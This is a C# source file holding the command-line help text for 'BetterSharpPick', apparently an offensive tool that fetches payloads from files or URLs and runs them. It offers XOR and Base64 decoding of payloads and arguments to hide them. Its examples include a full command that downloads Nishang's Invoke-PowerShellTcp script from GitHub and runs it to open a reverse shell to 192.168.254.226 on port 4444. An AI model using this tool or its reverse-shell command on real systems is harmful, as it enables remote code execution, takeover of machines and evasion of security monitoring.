using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BetterSharpPick.Util
{
    public static class HelpText
    {
        public static void Print()
        {
            Console.WriteLine(@"
USAGE:
  BetterSharpPick [-xor <0-255>] [-path <file-or-url>] [-c <text>] [-arg <string>] [-b64] 

DESCRIPTION:
  -path <value>        : Payload file path or URL.
  -c <value>           : Inline payload text.
  -arg <string>       : The remaining values are command arguments (each will be decoded when -b64 is set).
  -xor <0-255>         : Single decimal byte key. XOR-decodes the payload; command args are also XOR-decoded with the same key.
  -b64                 : Indicates that values are Base64-encoded (keys/values will be decoded).

EXAMPLES:
  BetterSharpPick -path http://example.com/file.bin
  BetterSharpPick -b64 -c ZWNobyBoZWxsbyA= -arg d29ybGQ=
  BetterSharpPick -xor 140 -path http://example.com/file.bin -b64
  BetterSharpPick -path https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -arg 'Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444'
");
        }

    }
}